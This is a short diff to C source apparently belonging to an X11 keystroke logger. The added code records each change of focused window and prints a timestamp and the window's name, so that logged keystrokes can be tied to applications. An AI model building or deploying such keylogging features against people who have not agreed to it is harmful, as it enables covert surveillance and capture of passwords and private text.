@@ -28,7 +28,21 @@ struct keystroke_info
 #ifndef DEBUG
 static void process_event( const struct keystroke_info *info )
 {
+    static Window current = 0;
+    char time_buf[ 22 ] = { 0 };
     const char *out;
+
+    /* notify change of focus with timestamp */
+    if ( current != info->focused_window )
+    {
+        current = info->focused_window;
+
+        /* format timestamp */
+        strftime( time_buf , 22 , "%d/%m/%Y @ %H:%M:%S" ,
+                  localtime( &info->timestamp ) );
+
+        printf( "\n>>> %s : %s\n" , time_buf , info->focused_window_name );
+    }
 
     /* overload some special keystrokes */
     switch ( info->original_keysym )
